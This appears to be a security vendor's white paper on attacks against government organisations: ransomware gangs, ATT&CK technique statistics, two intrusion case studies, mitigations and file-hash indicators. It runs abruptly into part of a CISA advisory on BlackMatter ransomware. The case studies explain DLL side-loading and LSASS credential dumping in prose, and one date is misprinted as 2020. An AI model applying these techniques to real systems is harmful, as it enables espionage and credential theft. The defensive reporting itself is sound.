\nCouncil.\n\nhttps://www.zdnet.com/article/norway-says-russian-hacking-group-apt28-is-behind-august-2020-parliament-hack/\nhttps://us-cert.cisa.gov/ncas/current-activity/2021/04/26/fbi-dhs-cisa-joint-advisory-russian-foreign-intelligence-service\nhttps://us-cert.cisa.gov/ncas/current-activity/2021/04/26/fbi-dhs-cisa-joint-advisory-russian-foreign-intelligence-service\nhttps://symantec-enterprise-blogs.security.com/blogs/election-security/election-hacking-faq\nhttps://symantec-enterprise-blogs.security.com/blogs/election-security/election-hacking-faq\nhttps://us-cert.cisa.gov/ncas/alerts/aa20-301a\nhttps://www.zdnet.com/article/north-korea-has-tried-to-hack-11-officials-of-the-un-security-council/\nhttps://www.zdnet.com/article/north-korea-has-tried-to-hack-11-officials-of-the-un-security-council/\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nIn November 2020, Cybereason identified a new modular spyware suite dubbed KGH_SPY and a new malware \nstrain dubbed CSPY Downloader being employed in attacks by Springtail. The group was observed targeting a \nwide array of victim organizations in the U.S., Europe, Japan, South Korea, and Russia. The target organizations \nincluded pharmaceutical and research companies working on COVID-19 therapies, government and defense \norganizations, journalists, and various human rights groups.\n\nMalicious Activity Trends\nIn order to assess general levels of malicious activity, we examined telemetry from 1,100 government customers \nover the past 15 months, namely all of 2020 and the first quarter of 2021. \n\nFigure 1: Malware Detections by Month, January 2020 to April 2021\n\n0\n\n5,000\n\n10,000\n\n15,000\n\n20,000\n\n25,000\n\n30,000\n\nMarFebJan\n2021\n\nDecNovOctSepAugJulJunMayAprMarFebJan\n2020\n\nD\net\n\nec\nti\n\no\nns\n\nMalware detections in these organizations trended downwards in this time period. While the trend is welcome \nnews, it shouldn’t be cause for complacency since the decline was relatively small. Secondly, the biggest sources of \nrisk to government organizations—espionage and ransomware—tend to be low prevalence but high impact threats. \n\nRansomware\n\nWhile the number of ransomware detections is showing a downward trend, this can be misleading as the number \nof victims is still considerable and, due to changing tactics from ransomware operators, the impact from successful \nattacks can be devastating. \n\nIt should also be noted that the data shown in Figure 1 is only a representative sample of the overall number of \nattacks involving ransomware. Most targeted ransomware operators, for example, recompile their ransomware for \nevery new attack. This means that the variant of the ransomware used in an attack may be blocked by a generic or \nmachine learning-generated detection signature rather than a detection linked to that ransomware family.\n\nhttps://www.cybereason.com/blog/back-to-the-future-inside-the-kimsuky-kgh-spyware-suite\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nFigure 2: Ransomware Detections for Govenment Sector, January 2020 to March 2021\n\n0\n\n100\n\n200\n\n300\n\n400\n\n500\n\nMarFebJan\n2021\n\nDecNovOctSepAugJulJunMayAprMarFebJan\n2020\n\nD\net\n\nec\nti\n\no\nns\n\nWhile in the past attackers were content with encrypting a victim organization’s files, now most of the leading \nransomware operators are stealing data prior to encryption and using it to increase the pressure on victims to pay \nup. The threat actors threaten to release the stolen data or sell it to the highest bidder if the victim doesn’t pay a \nransom.\n\nSome ransomware gangs that have carried out ransomware attacks employing these tactics include the following:\n\nMaze\n\nThe now-defunct Maze ransomware gang was the first ransomware gang to adopt the tactic of exfiltrating data \nfrom victim organizations prior to encryption and threatening to release this data unless the ransom is paid. Maze \nalso operated as a ransomware-as-a-service (RaaS), providing the malware to affiliates and sharing a portion of \nprofits made from successful attacks.\n\nIn September 2020, Maze targeted Fairfax County Public Schools (FCPS). The school was just one of the U.S. public \nsector organizations hit by Maze since it first appeared in May 2019. Maze published 100 MB of data in an effort \nto pressure FCPS into paying a ransom. The ransomware gang said that the data represented just 2% of the total \namount stolen during the attack. \n\nMaze shut down operation shortly after the FCPS attack, with many of its affiliates at the time moving to the newly \nemerging Egregor RaaS. \n\nBabuk\n\nIn April 2021, the Babuk ransomware gang targeted Washington DC’s Police Department and posted screenshots \nof some of the 250 GB of data it allegedly stole. The screenshots published by Babuk appeared to contain folders \nrelating to police operations, DC gangs, and police disciplinary records. Babuk even claimed to have files relating to \narrests following the storming of the U.S. Capitol building on January 6.\n\nhttps://www.bleepingcomputer.com/news/security/fairfax-county-schools-hit-by-maze-ransomware-student-data-leaked/\nhttps://www.databreachtoday.com/dc-metropolitan-police-hit-cyberattack-a-16474\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nJust two weeks later, Babuk released what it claimed was another 22 GB of data belonging to the police \ndepartment following the breakdown of ransom negotiations. The gang published the data on its dedicated data \nleak website. According to reports, the Babuk operators were initially seeking a $4 million ransom. According \nto the screenshots posted by Babuk, the police department offered $100,000, but this wasn’t acceptable to the \nransomware gang. The additional leaked data allegedly included arrest files, financial files, case files, disciplinary \nfiles, and more.\n\nA relatively new arrival to the ransomware scene, Babuk first appeared in January 2021. The ransomware gang \ntargets victims in human-operated attacks. While Babuk initially used the strong Elliptic-curve Diffie–Hellman \nalgorithm to encrypt files, the ransomware gang has since claimed that it will no longer be encrypting victims’ data \nand will instead solely focus on data theft and extortion.\n\nRyuk and Conti\n\nIn October 2020, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) issued a warning about an \nincrease in Emotet attacks against state and local government organizations. The Emotet Trojan was originally \ndesigned to steal banking credentials from an infected computer and also add it to a botnet. However, Emotet \ndeveloped into a major distribution channel for other malware families, including targeted ransomware threats such \nas Ryuk and Conti. \n\nRyuk and Conti, along with the GoGalocker and MegaCortex ransomware families, are controlled by a single \nadversary that Symantec calls Miner. The ransomware threats operate on a ransomware-as-a-service (RaaS) \nbusiness model, with the creators sharing the ransomware with affiliated attackers in exchange for a cut of the \nransom. \n\nIn all of Miner’s ransomware operations, the threat actors use Cobalt Strike, which runs in the memory of infected \ncomputers, making detection difficult. Cobalt Strike is used by Miner to download additional tools and to create a \nreverse shell providing the attackers with additional access. \n\nMiner was likely leasing access to Emotet from the botnet’s operators and using that access to target its victims \nwith Ryuk. Ryuk was previously distributed by the Trickbot botnet.\n\nHowever, in early 2021, law enforcement agencies announced they had taken control of the Emotet botnet’s \ninfrastructure, which they used to deliver an update that removed the malware from infected computers.\n\nThis did not spell the end for Miner, though, which also relies on malicious spam campaigns, and compromising \nexposed RDP connections to gain access to victim networks, mounting brute force and password spraying attacks \nagainst RDP. \n\nIn August 2020, Conti joined the list of targeted ransomware families to create a public data leak website in order \nto increase the pressure on victims to pay a ransom. Conti is believed to have strong links to Ryuk. While Ryuk was \nbeing distributed via the Trickbot botnet, in July 2020, the botnet stopped delivering Ryuk and begun delivering \nConti instead.\n\nThe Conti ransomware recently made headlines when it infected Ireland’s Health Service Executive (HSE), the \ncountry’s national health service, demanding a $20 million ransom for the return of stolen data.\n\nNetwork-Based Activity\n\nMalware detections form only one part of the picture, and more information can be gleaned from attacks blocked \non the network by our Intrusion Prevention (IPS) technologies. Malicious network-based activity reveals more \ninformation about the extent of malicious activity on organizations’ networks by blocking activity at the application \nlayer. If a machine on a network becomes infected, the malware is likely to attempt to contact a command and \ncontrol (C&C) server, which can also trigger these detections. Looking at the number of network detections \nattempting to contact a C&C server can give us a more realistic idea about how many infected machines are on a \nnetwork and a truer picture of the extent of malicious activity in a sector. \n\nhttps://www.databreachtoday.com/babuk-ransomware-gang-posts-more-dc-metro-police-data-a-16575\nhttps://www.bleepingcomputer.com/news/security/babuk-quits-ransomware-encryption-focuses-on-data-theft-extortion/\nhttps://www.bleepingcomputer.com/news/security/cisa-emotet-increasing-attacks-on-us-state-local-governments/\nhttps://www.bleepingcomputer.com/news/security/emotet-botnet-disrupted-after-global-takedown-operation/\nhttps://www.bleepingcomputer.com/news/security/emotet-botnet-disrupted-after-global-takedown-operation/\nhttps://www.bleepingcomputer.com/news/security/ryuk-ransomware-operation-updates-hacking-techniques/\nhttps://www.bleepingcomputer.com/news/security/ryuk-ransomware-operation-updates-hacking-techniques/\nhttps://www.rte.ie/news/ireland/2021/0516/1221933-dept-of-health/\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nFigure 3: IPS Detections, January 2020 to March 2021\n\n0\n\n100,000\n\n200,000\n\n300,000\n\n400,000\n\n500,000\n\nMarFebJan\n2021\n\nDecNovOctSepAugJulJunMayAprMarFebJan\n2020\n\nD\net\n\nec\nti\n\no\nns\n\nIPS detections have trended upwards in the same time period, suggesting that while the number of confirmed \nmalware infections fell slightly, the number of infection attempts has risen.\n\nFigure 4: Top 10 Regions with a Government Sector Targeted by Malware in 2020\n\nU.S.\n25%\n\nMexico\n17%\n\nItaly\n7% Brazil\n\n24%\n\nSpain  3%\n\nThailand  4%\n\nSouth Africa  4%\n\nAustralia  4%\n\nQatar  6%\n\nNew Zealand  6%\n\nWhen looking at the countries where the government sector is most frequently targeted by malware, the U.S. is the \nmost represented, accounting for nearly a quarter of all malware detections. This is unsurprising, since the U.S. is a \npopulous country, with multiple layers of government at both federal and state level. \n\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nWhen it comes to countries targeted by malware the most, in addition to the U.S. we often see China, the UK, and \nFrance in the top 10, countries that didn’t make the list here. The fact that Brazil and Mexico take second and third \nplace here indicates that the government sector in these countries is of significant interest to attackers.  \n\nWith regard to the other countries in the top 10, there are few surprises, many being large states with federal \ngovernment structures.\n\nAttack Tactics, Techniques, and Procedures\n\nThe MITRE ATT&CK® matrix classifies attack techniques and tactics. It divides attack tactics into the following 12 \nmain categories, which map to the typical attack chain between vector and payload execution:\n\n•\t Initial Access\n\n•\t Execution\n\n•\t Persistence\n\n•\t Privilege Escalation\n\n•\t Defense Evasion\n\n•\t Credential Access\n\n•\t Discovery\n\n•\t Lateral Movement\n\n•\t Collection\n\n•\t Command and Control\n\n•\t Exfiltration\n\n•\t Impact\n\nWithin these categories, there are 245 distinct attack techniques. Some may be employed at multiple stages of \nan attack chain, meaning they can apply to more than one of the above 12 categories. Symantec Cloud Analytics \nclassifies all incidents with a MITRE technique name. With millions of incidents logged each year, it is possible to \nform a picture of the most frequently used techniques. Cloud Analytics draws on intelligence gathered from analyst \ninvestigations and leverages advanced machine learning to identify and block patterns of suspicious activity. \nBecause it is designed to identify malicious activity, more so than malicious tools, the vast majority of incidents \ncreated relate to living-off-the-land tactics.\n\nhttps://attack.mitre.org/matrices/enterprise/\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nFigure 5: Top MITRE Techniques Used in Attacks Against the Government Sector in 2020\n\nPowershell\n37%\n\nRemote\nFile Copy\n\n11%\n\nRegsvr32\n10%\n\nObfuscated\nFiles\n\nor Information\n21%\n\nMasquerading  2%\n\nMshta  2%\n\nService Execution  2%\n\nWindows Management Instrumentation 4%\n\nModify Registry  5%\n\nCredential Dumping  6%\n\nThe following are some of the most common Mitre ATT&CK techniques used by threat actors targeting the \ngovernment sector in 2020:\n\n•\t PowerShell: PowerShell is a powerful interactive command-line interface and scripting environment included \nin the Windows operating system. It can be abused to perform a number of actions, including discovery of \ninformation and execution of code. \n\n•\t Obfuscated Files or Information: Attempting to make a malicious file difficult to discover by encoding it or \notherwise obfuscating its contents.\n\n•\t Remote File Copy: Transferring tools or files from external sources onto a compromised network, either via \ndownload from a command and control (C&C) server or through other methods such as FTP.\n\n•\t Regsvr32: Regsvr32.exe is a command-line program used to register and unregister object linking and \nembedding controls. Attackers may abuse Regsvr32.exe for proxy execution of malicious code.\n\n•\t Credential Dumping: Obtaining credentials, either hashed or in clear text, usually through a dump of the \ncomputer’s memory. A range of freely available tools such as Mimikatz or LaZagne can be used to perform \nthis task.\n\n•\t Modify Registry: Modifying the registry to hide configuration information within registry keys, or deleting \ninformation in order to remove evidence of intrusions.\n\n•\t Windows Management Instrumentation (WMI): Microsoft command-line tool, which can be used to execute \ncommands on remote computers.\n\n•\t Service Execution: The Windows service control manager (services.exe) is an interface to manage and \nmanipulate services. It can be used to execute malicious commands or payloads. \n\n•\t Mshta: Mshta.exe is a Microsoft utility that executes HTML Application (HTA) files. Attackers may abuse \nmshta.exe for proxy execution of malicious .hta files and JavaScript or VBScript through a trusted Windows \nutility.\n\n•\t Masquerading: Manipulating files and tools in order to make them appear to be legitimate or benign in order \nto evade detection.\n\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nCase Study 1 - Legitimate Executables Abused to \nSide-load Malicious DLLs\n\nIn April 2021, Symantec technology identified a number of suspicious files on multiple computers on the \nnetworks of two government agencies, one in a Southeast Asian country and another in a country in South \nAsia. The investigation found that the attackers were abusing legitimate executables for side-loading \nmalicious DLLs in order to execute a backdoor threat (RDoorBackdoor) on victim computers.\n\nThe motive for the attacks appears to have been information gathering. In one case, the attackers appeared \nto be targeting information related to the Association of Southeast Asian Nations (ASEAN).\n\nRDoorBackdoor has been in use since at least 2018. It appears to be used in targeted attacks only but it is \nunclear if the backdoor is a shared tool or exclusive to one attack group. The attack activity discussed in this \ncase occurred between June 2020 and April 2021.\n\nWhile the initial infection vector is unknown, the lead up to the final payload begins with RDoorDropper, a \nself-extracting (SFX) RAR file. RDoorDropper contains three files:\n\n•\t A legitimate and signed PE vulnerable to DLL search-order hijacking\n\n•\t A malicious loader (RDoorLoader)\n\n•\t An encrypted .pak file containing the final payload (RDoorBackdoor)\n\nWe observed RDoorDropper variants abusing PEs for four different legitimate applications and a \ndiscontinued plug-in for Internet Explorer:\n\nTable 1: Legitimate PEs Abused by the Attackers\n\nLegitimate binary Loader (RDoorLoader)\nEncrypted payload \n(RDoorBackdoor)\n\nSiteAdv.exe (McAfee SiteAdvisor) SiteAdv.dll SiteAdv.pak\n\nssr32.exe (Sophos SafeStore Restore) safestore32.dll safestore.pak\n\nwsc_proxy.exe (Avast wsc_proxy) wsc.dll proxycfg.pak\n\ncoInst.exe (Norton Identity Safe) msvcr100.dll coinstcfg.dat\n\nchrome_frame_helper.exe  \n(Google Chrome Frame)\n\nchrome_frame_helper.dll chrome_frame_helper.pak\n\nWhen opened, RDoorDropper extracts the embedded files and executes the legitimate PE in order to load \nRDoorLoader, which is side-loaded via search order hijacking by the legitimate PE. \n\nCase Studies\nThe following two case studies are examples of some of the more recent investigations carried out by the \nSymantec Threat Hunter Team. The incidents, which both impacted organizations in the government sector, offer a \nsnapshot into what these organizations are targeted by and highlight a small selection of the methods used by the \nattackers. \n\nCase Study 1 - Legitimate Executables Abused to Side-load Malicious DLLs\n\nhttps://en.wikipedia.org/wiki/Google_Chrome_Frame\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nWhat is DLL search order hijacking?\n\nDynamic link library (DLL) side-loading via search order hijacking is a cyber attack method that takes \nadvantage of how Microsoft Windows programs handle DLL files. In DLL search order hijacking attacks, \nmalware places a spoofed malicious DLL file in a specific Windows directory so that the operating system \nloads it instead of the legitimate file. \n\nWindows allows programs to load DLLs at runtime and programs can specify the location of DLLs to load \nby specifying a full path, using DLL redirection, or by using a manifest. If none of these methods are used, \nWindows tries to locate the DLL by searching a list of directories in a set order. \n\nAttackers abuse this search feature by placing a malicious DLL in one of those directories. Often this is the \ncurrent working directory of the program. Then Windows finds and loads the malicious DLL before the \nlegitimate version. \n\nIt is also possible to execute code within the context of a legitimate portable executable (PE) by abusing \ninsecure library references. If a developer allows LoadLibrary to resolve the path of a library dynamically \nthen that PE will also look in the current directory for the library DLL. \n\nA threat actor can copy a legitimate PE to a directory where the attacker has write access. If the attacker \ncreates a custom payload DLL, the program will load that DLL and execute the malicious code. This can be \nbeneficial for the attacker as the PE may be signed and appear trustworthy to some security solutions, and \nit may also bypass application white listing (AWL).\n\nPost compromise\n\nRDoorBackdoor\n\nRDoorBackdoor is a fully featured backdoor with the ability to install itself as a service, log keystrokes, \ncommunicate with its command and control server (C&C) using HTTP, HTTPS, DNS, UDP, or TCP, and listen \non a local port for commands.\n\nInstances of RDoorBackdoor are usually identical with the exception of embedded and encrypted \nconfiguration which determines:\n\n•\t C&C communication method\n\n•\t Service details\n\n•\t Installation directory\n\nThe attackers using RDoorBackdoor used a number of non-malware techniques for credential theft:\n\n•\t PowerShell was used to launch rundll32.exe in order to dump the memory of a process using the \nMiniDump function of comsvcs.dll (this is a technique used often to dump LSASS memory)\n\n•\t Reg.exe was used to dump the SAM and SYSTEM registry hives\n\n•\t A legitimate Avast tool was used by the attackers to dump LSASS memory\n\nOther post-compromise tools used by the attackers included:\n\nLSASS dumping tool\n\n•\t The only credential theft tool found to be uses by the attackers\n\n•\t Similar to how PowerShell is used, this tool can dump LSASS process memory using the legitimate \ncomsvcs.dll file\n\nBrowsingHistoryView\n\n•\t A utility that reads the history data of different web browsers\n\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nChrome secrets stealer\n\n•\t A Chrome secrets and history stealer based on https://github.com/LimerBoy/Adamantium-Thief/tree/\nmaster/Stealer/Stealer\n\nNirCmd\n\n•\t Small command-line utility for carrying out various tasks without a user interface\n\nSuspected NirCMD\n\n•\t Found disguised with a similar name to other suspicious files\n\nCommand-line downloader\n\n•\t This downloader can be passed proxy information and a remote host and will attempt to download \nand execute a DLL file\n\nForfiles\n\n•\t Dual-use tool that searches files according to the specified search mask and runs a specified \ncommand on each item found\n\n•\t Used by the attackers to search for a specific file name\n\nMultiple machines where RDoorBackdoor was observed also had additional malware and tools present, \nincluding the following:\n\n•\t GupdataLoader: A simple loader that reads and executes shellcode from a separate file named favico.\nico.\n\n•\t ChromeDecryptor: Chrome secrets and history stealer based on the LimerBoy/Adamantium-Thief \nstealer.\n\n•\t NightScoutBackdoor and NightScoutDropper: Malware previously described by ESET (Malicious \nUpdate variant 1).\n\n•\t PrcLoader: A loader for the aPLib compressed executable stored in the Windows Registry (HKEY_\nCLASSES_ROOT\\.prc\\Shell).\n\n•\t GrouperLoader: A service-based loader for shellcode stored in the Windows Registry. Shellcode is \nencrypted using the computer name as a key.\n\n•\t UpdateRootkitDropper: A dropper for embedded rootkit drivers (32-bit & 64-bit) and backdoor \npayloads stored in a separate file (res.dat). The dropper contains code consistent with previously \nseen instances of ZXShell that also included rootkit capabilities. Extracted rootkit drivers are tagged \nas UpdateRootkit. Several instances of droppers for UpdateRootkitDropper were also observed \n(UpdateRootkitDropperDropper). Final payloads stored in a separate file (res.dat) are likely instances \nof ZXShell.\n\n•\t DosEmulator and FastProxy: Tools previously described by Trend Micro that are part of the Korplug/\nPlugX build and control toolset.\n\nhttps://github.com/LimerBoy/Adamantium-Thief/tree/master/Stealer/Stealer\nhttps://www.welivesecurity.com/2021/02/01/operation-nightscout-supply-chain-attack-online-gaming-asia/\nhttps://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2015/2015.09.17.Operation_Iron_Tiger/wp-operation-iron-tiger.pdf\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nCase Study 2 - Early Access to Unpatched Microsoft \nExchange Server Vulnerabilities\n\nSnail (aka Calypso) are believed to be in operation since 2016. First publicized in October 2019, the group is \nbelieved to be of Asian origin and is involved in espionage-type operations on a global scale. Snail are known \nto exploit publicly facing applications to install their malware. The group can be identified by the use of a \ncustom malware called Calypso RAT (Trojan.Calypso).\n\nThe group has been observed targeting organizations in various sectors including the government, as well as \nelectronics, IT, and transport.\n\nOnce they have compromised a network, Snail are known to deploy web shells and the custom Calypso RAT \nmalware. Additionally, Snail have reportedly leveraged open-source tools such as network and port scanners \nand tunneling tools. The group has also leveraged exploit tools such as EternalBlue, DoublePulsar, and \nEternalRomance.\n\nOrganizations in the following regions have been targeted by Snail:\n\n•\t Afghanistan\n\n•\t China\n\n•\t India\n\n•\t Japan\n\n•\t South Korea\n\n•\t U.S.\n\nSnail are known to target public-facing applications in order to initially compromise victims. In 2020, Snail \nreportedly had early access to an unpatched Microsoft Exchange Server vulnerability chain (ProxyLogon) in \norder to deploy their malware.\n\nProxyLogon is a pre-authentication remote code execution (RCE) vulnerability chain (CVE-2021-26855, CVE-\n2021-26857, CVE-2021-26858, and CVE-2021-27065) that can allow an attacker to take over any reachable \nExchange server, without the need for valid account credentials. \n\nBefore Microsoft released out-of-band patches for vulnerable versions of Exchange server on March 2, 2021, a \nnumber of APT groups, which included Snail, had already been exploiting ProxyLogon in the wild. This means \nthat the threat groups did not reverse engineer the Microsoft updates, as is often the case. However, it is \nunclear how the groups gained access to the details of the vulnerabilities before the release of the patches.\n\nOn March 1, 2020, a full day before Microsoft released patches, Snail used the ProxyLogon vulnerabilities \nto compromise the email servers of government entities in the Middle East and in South America. In the \nfollowing days, the group used the exploit to target additional servers of government entities and private \ncompanies in Africa, Asia, and Europe.\n\nThe group deployed a web shell, the Calypso RAT malware, and a custom backdoor. The malicious tools are \nloaded using DLL search-order hijacking (see Case Study 1) against legitimate executables also dropped by \nthe group.\n\nCase Study 2 - Early Access to Unpatched Microsoft Exchange Server \nVulnerabilities\n\nhttps://proxylogon.com/\nhttps://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nConclusion\nWhile cyber security is a challenge for every sector, those in the government sector are being targeted by a range \nof threat actors whose capabilities and persistence continue to grow. The government sector forms the backbone \nof civil service and, as such, a cyber attack against it can have dire consequences. This threat should not be \noverlooked and organizations must take the necessary steps and precautions to bolster their defensive capabilities \nto prevent them from falling prey to a cyber attack or data breach, and the people they serve from losing out on \nkey services. \n\nProtection: How Symantec Solutions Can Help\nThe Symantec Enterprise Business provides a comprehensive portfolio of security solutions to address today’s \nsecurity challenges and protect data and digital infrastructure from multifaceted threats.

Only allow RDP from specific known IP addresses and ensure you are using \nmulti-factor authentication (MFA).\n\n•\t Implement proper audit and control of administrative account usage. You could also implement one-time \ncredentials for administrative work to help prevent theft and misuse of admin credentials.\n\n•\t Create profiles of usage for admin tools. Many of these tools are used by attackers to move laterally \nundetected through a network.\n\n•\t Use application allow lists where applicable.\n\n•\t Locking down PowerShell can increase security, for example with the constrained language mode.\n\n•\t Make credential dumping more difficult, for example by enabling credential guard in Windows 10 or disabling \nSeDebugPrivilege.\n\n•\t MFA can help limit the usefulness of compromised credentials.\n\nEmail:\n\n•\t Enable MFA to prevent the compromise of credentials during phishing attacks.\n\n•\t Harden security architecture around email systems to minimize the amount of spam that reaches end-user \ninboxes and ensure you are following best practices for your email system, including the use of SPF and other \ndefensive measures against phishing attacks.\n\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nAppendix A: Indicators of Compromise (IOCs)\n\nCase Study 1 - Legitimate Executables Abused to Side-load Malicious DLLs\n\nRdoor Related\n\nSHA256 Description\n\n02d9dd1e5ba9219b4e4355cdaa03bec4c8f1f51987fd1fd0c1f874d8080289d9 RDoorDropper\n\nfb4a37d889c3464a77435263e8d34a8dd230a46c55b7898c759551dd67b8c1b1 RDoorDropper\n\neb095d26af3b46574b27f1b3607e7a18de7605ffa453697e19e379ca0e814df6 RDoorDropper\n\n3e2ace7c603cd2ea80621cf67bb6a4b3ae3da2ffda32e0634a6056362cb58321 RDoorDropper\n\nadbc72273d87ae5f507c34a9ab5146d7a3df66d04910488c42277af47e105578 RDoorDropper\n\nb09a936b948ec1196d4346f1f99f4ccc528e9bfec66b2da3c8c108fe0188c5f0 RDoorDropper\n\n3a89606cd9549dd15726948181dad1725ab7b89d6b07623f4087325bc03b9371 RDoorDropper\n\n0317fc04275e70014f70934701bc75023d843d67b582b6cc03fcf6c2d736db17 RDoorDropper\n\n1d6453e34951a4201d9b65275d2bc48354b1596486b1018d4ac4bd7cb96e081a RDoorDropper\n\n3dfb118bdcf2e9af07f26a6ca0636c574442bcce3b5a14e1fcba44ca975ad766 RDoorLoader\n\nfd5a032e0e00b9ebf7703a83d608928cb2539e5794ecaadd44089a86b6ac4d25 RDoorLoader\n\n1892716a335e73082f183a44c9769374b240e503658d2d2a7cc4c46ef7f3ffc6 RDoorLoader\n\nfa5f32457d0ac4ec0a7e69464b57144c257a55e6367ff9410cf7d77ac5b20949 RDoorLoader\n\n8317246b191ead7adf148a43fcf3f9f49897125fff89fcc8ebf5333c07d83aa1 RDoorLoader\n\n1ccef581820c55c2c46dd6140bc420891f4237f481264fedcc27e7d426858540 RDoorLoader\n\n084f5a29f60e183a6244bbcfa41565294adfd6503f695b65b3d89c763a69cc83 RDoorLoader\n\nLegitimate Applications Abused for Malware Loading\n\nSHA256 Description\n\n1ab4f52ff4e4f3aa992a77d0d36d52e796999d6fc1a109b9ae092a5d7492b7dd Google Chrome Frame\n\neb3b4e82ddfdb118d700a853587c9589c93879f62f576e104a62bdaa5a338d7b McAfee SiteAdvisor\n\n8b6352ef7e0b70db156691ae16aa52f245141f62e2661f54532f3832cad732de Avast remediation tool\n\nfbb42e8ddbf4a9ca87f292d68b4dc3d53fae6ddf2137f6c5bc7ad7d5ae1edf6b Avast remediation tool\n\n83f40e70ea3ba0e614d08f1070dafe75092660003b8a1f8b563d4f5b012f4bae Kaspersky setup\n\n3124fcb79da0bdf9d0d1995e37b06f7929d83c1c4b60e38c104743be71170efe McAfee OEM module\n\n59f6a21bb31fbfe4909945567f0ede3b34685cde78f5a72aea3074a677c8f5b1 Sophos SafeStore restore tool\n\nPost-Compromise Tools\n\nSHA256 Description\n\n41a248b6b8df4a81845bcdf10e4bb5e1eb3583a8d396f66a87b41d95c25d250c Command line DLL downloader\n\n67ebc03e4fbf1854a403ea1a3c6d9b19fd9dc2ae24c7048aafbbff76f1bea675 Loader\n\nf92cac1121271c2e55b34d4e493cb64cdb0d4626ee30dc77016eb7021bf63414 Loader\n\n6e4d5950f1419ae3922f135ec7be66be599f60e63458358f39ad684643cb6fa1\nScanner capable of scanning and fingerprinting multiple \nnetwork services.

Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore \nsystems for DLL hijacking weaknesses.\n\nUse the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files \nfor side-by-side problems in software.\n\nM1038\t Execution Prevention\t\n\nAdversaries may use new DLLs to execute this technique. Identify and block potentially malicious software \nexecuted through search order hijacking by using application control solutions capable of blocking DLLs loaded by \nlegitimate software.\n\nM1044\t Restrict Library Loading\t\n\nDisallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for \nXP+ and Server 2003+.\n\nEnable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. \n%SYSTEMROOT%)to be used before local directory DLLs (e.g. a user’s home directory).\n\nThe Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration > [Policies] > \nAdministrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode.

See the ATT&CK for Enterprise for all\nreferenced threat actor tactics and techniques.\n\nThis joint Cybersecurity Advisory was developed by the Cybersecurity and Infrastructure\nSecurity Agency (CISA), the Federal Bureau of Investigation (FBI), and the National Security\nAgency (NSA) to provide information on BlackMatter ransomware. Since July 2021,\nBlackMatter ransomware has targeted multiple U.S. critical infrastructure entities, including\ntwo U.S. Food and Agriculture Sector organizations.\n\nThis advisory provides information on cyber actor tactics, techniques, and procedures (TTPs)\nobtained from a sample of BlackMatter ransomware analyzed in a sandbox environment as\nwell from trusted third-party reporting. Using embedded, previously compromised\ncredentials, BlackMatter leverages the Lightweight Directory Access Protocol (LDAP) and\nServer Message Block (SMB) protocol to access the Active Directory (AD) to discover all\nhosts on the network. BlackMatter then remotely encrypts the hosts and shared drives as\nthey are found.\n\nRansomware attacks against critical infrastructure entities could directly affect consumer\naccess to critical infrastructure services; therefore, CISA, the FBI, and NSA urge all\norganizations, including critical infrastructure organizations, to implement the\nrecommendations listed in the Mitigations section of this joint advisory. These mitigations will\nhelp organizations reduce the risk of compromise from BlackMatter ransomware attacks.\n\nClick here for a PDF version of this report.\n\nTechnical Details\n\nOverview\n\nhttps://us-cert.cisa.gov/ncas/alerts/aa21-291a\nhttps://us-cert.cisa.gov/ncas/tips/ST04-002\nhttps://us-cert.cisa.gov/ncas/tips/ST05-012\nhttps://attack.mitre.org/versions/v9/techniques/enterprise/\nhttps://us-cert.cisa.gov/sites/default/files/publications/Joint-CISA-FBI-NSA_CSA_AA21-291A_BlackMatter_Ransomware.pdf\n\n\n2/8\n\nFirst seen in July 2021, BlackMatter is ransomware-as-a-service (Raas) tool that allows  the\nransomware's developers to profit from cybercriminal affiliates (i.e., BlackMatter actors) who\ndeploy it against victims. BlackMatter is a possible rebrand of DarkSide, a RaaS which was\nactive from September 2020 through May 2021. BlackMatter actors have attacked numerous\nU.S.-based organizations and have demanded ransom payments ranging from $80,000 to\n$15,000,000 in Bitcoin and Monero.\n\nTactics, Techniques, and Procedures\n\nThis advisory provides information on cyber actor TTPs obtained from the following sample\nof BlackMatter ransomware, which was analyzed in a sandbox environment, as well as from\ntrusted third parties: SHA-256:\n706f3eec328e91ff7f66c8f0a2fb9b556325c153a329a2062dc85879c540839d . (Note: click\n\nhere to see the sample’s page on VirusTotal.)\n\nThe BlackMatter variant uses embedded admin or user credentials that were previously\ncompromised and NtQuerySystemInformation  and EnumServicesStatusExW  to\nenumerate running processes and services, respectively. BlackMatter then uses the\nembedded credentials in the LDAP and SMB protocol to discover all hosts in the AD and the\nsrvsvc.NetShareEnumAll  Microsoft Remote Procedure Call (MSRPC) function to\n\nenumerate each host for accessible shares. Notably, this variant of BlackMatter leverages\nthe embedded credentials and SMB protocol to remotely encrypt, from the original\ncompromised host, all discovered shares’ contents, including ADMIN$ , C$ , SYSVOL , and\nNETLOGON .\n\nBlackMatter actors use a separate encryption binary for Linux-based machines and routinely\nencrypt ESXi virtual machines. Rather than encrypting backup systems, BlackMatter actors\nwipe or reformat backup data stores and appliances.\n\nTable 1 maps BlackMatter’s capabilities to the MITRE ATT&CK for Enterprise framework,\nbased on the analyzed variant and trusted third-party reporting.\n\nTable 1: Black Matter Actors and Ransomware TTPs\n\nTactic Technique Procedure \n\nPersistence\n[TA0003]\n\nExternal Remote Services\n[T1133]\n\nBlackMatter leverages legitimate remote\nmonitoring and management software and\nremote desktop software, often by setting\nup trial accounts, to maintain persistence\non victim networks. 